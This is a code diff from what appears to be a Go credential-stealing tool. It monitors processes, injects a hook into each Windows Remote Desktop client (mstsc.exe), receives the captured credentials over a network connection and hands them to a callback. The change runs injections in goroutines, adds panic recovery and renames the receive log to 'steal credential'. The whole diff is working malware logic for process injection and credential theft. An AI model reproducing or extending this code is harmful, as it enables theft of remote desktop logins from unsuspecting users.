@@ -95,21 +95,30 @@ func (srv *Server) psmonEventHandler(_ context.Context, event uint8, data interf
 		return
 	}
 	for _, ps := range data.([]*process.PsInfo) {
-		if ps.Name == "mstsc.exe" {
-			srv.injectHook(ps)
+		if ps.Name != "mstsc.exe" {
+			continue
 		}
+		go func(ps *process.PsInfo) {
+			srv.injectHook(ps)
+		}(ps)
 	}
 }
 
 func (srv *Server) injectHook(process *process.PsInfo) {
+	defer func() {
+		if r := recover(); r != nil {
+			srv.log(logger.Fatal, xpanic.Print(r, "Server.injectHook"))
+		}
+	}()
 	hook := srv.hook.Get()
 	defer srv.hook.Put(hook)
+	srv.log(logger.Critical, "start inject hook to process", process.PID)
 	err := srv.injector(uint32(process.PID), hook)
 	if err != nil {
 		srv.logf(logger.Error, "failed to inject hook to process %d: %s", process.PID, err)
 		return
 	}
-	srv.log(logger.Info, "inject hook to process", process.PID)
+	srv.logf(logger.Critical, "inject hook to process %d successfully", process.PID)
 }
 
 func (srv *Server) serve(listener net.Listener) {
@@ -187,7 +196,7 @@ func (srv *Server) handleClient(conn net.Conn) {
 		srv.log(logger.Error, "failed to unmarshal credential:", err)
 		return
 	}
-	srv.log(logger.Info, "receive credential")
+	srv.log(logger.Critical, "steal credential")
 	srv.callback(cred)
 }
 
